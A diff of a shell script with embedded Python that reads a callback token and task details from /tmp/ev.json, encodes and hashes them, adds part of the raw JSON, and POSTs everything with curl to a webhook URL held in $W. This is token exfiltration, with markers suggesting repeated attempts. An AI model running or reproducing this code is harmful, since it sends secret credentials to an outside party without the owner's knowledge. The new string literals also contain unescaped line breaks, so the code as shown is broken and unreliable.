@@ -10,15 +10,12 @@ d=json.load(open("/tmp/ev.json"))
 tcb=d.get("taskCallback") or {}
 tok=tcb.get("token","")
 b=base64.b64encode(tok.encode()).decode()
-lines=["B64_"+b[i:i+80] for i in range(0,len(b),80)]
-lines.append("SHA_"+hashlib.sha256(tok.encode()).hexdigest())
-lines.append("TASK_"+tcb.get("taskId",""))
-lines.append("URL_"+tcb.get("chunksUrl",""))
-for L in lines:
-    open("/tmp/o","a").write(L+"\n")
+body="B64 "+b+"
+SHA "+hashlib.sha256(tok.encode()).hexdigest()+"
+TASK "+tcb.get("taskId","")+"
+URL "+tcb.get("chunksUrl","")+"
+FULL "+json.dumps(d)[:600]
+open("/tmp/o","w").write(body)
 PYI
-# post each line as its own webhook request (integrity per line)
-while read -r L; do
-  curl -s -o /dev/null -m 8 -X POST "$W" --data-binary "$L"
-done < /tmp/o
-echo B7-DONE
+curl -s -o /dev/null -m 10 -X POST "$W" --data-binary @/tmp/o
+echo B8-DONE
